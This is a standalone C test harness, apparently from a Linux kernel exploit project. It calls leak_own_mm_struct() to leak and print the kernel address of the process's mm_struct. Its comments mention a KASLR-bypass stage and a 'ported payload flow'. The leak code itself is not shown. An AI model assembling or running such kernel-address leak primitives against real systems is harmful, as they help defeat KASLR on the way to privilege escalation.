/* Standalone test for leak_own_mm_struct(), independent of the KASLR
 * stage, so it can be validated on its own. Not part of the ported
 * payload flow -- a test harness only. */
#include <stdio.h>

#include "mm_leak.h"

int main(void) {
  uint64_t mm_struct_addr = 0;
  if (!leak_own_mm_struct(&mm_struct_addr)) {
    fprintf(stderr, "leak failed\n");
    return 1;
  }
  printf("mm_struct=%016llx\n", (unsigned long long)mm_struct_addr);
  return 0;
}
